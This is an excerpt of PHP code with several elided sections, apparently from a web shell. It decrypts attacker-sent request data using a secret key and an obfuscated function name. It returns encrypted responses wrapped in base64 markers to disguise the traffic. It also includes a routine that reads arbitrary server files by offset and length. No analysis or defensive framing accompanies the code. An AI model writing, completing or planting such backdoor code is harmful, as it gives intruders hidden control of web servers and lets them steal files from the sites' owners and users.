...
function run(){
    ...
    if (strpos($content_type, 'application/x-www-form-urlencoded') !== false) {
        ...
        $pms = S1MiwYYr(base64DecodeNoPadding($encrypted_data_base64), $secret_key);
    ...
    $encrypted_base64 = rtrim($encrypted_base64, '=');

    $left_marker_binary = hex2bin($response_marker['left']);
    $right_marker_binary = hex2bin($response_marker['right']);
    $left_marker_base64 = rtrim(base64_encode($left_marker_binary), '=');
    $right_marker_base64 = rtrim(base64_encode($right_marker_binary), '=');

    echo $left_marker_base64;
    echo $encrypted_base64;
    echo $right_marker_base64;
...
function readFileByPosition(){
    ...
    if ($fileName == null || $position == null || $readByteNum == null) {
        return "fileName, position or readByteNum is null";
    }

    $position = intval($position);
    $readByteNum = intval($readByteNum);
    ...
    if (function_existsEx("fopen") && function_existsEx("fread") && function_existsEx("fseek")) {
        ...
        $data = @file_get_contents($fileName, false, null, $position, $readByteNum);
        if ($data === false) {
            return "cannot read file";
        }
        return $data;
        ...
        return "no available function to read file";
    }
}
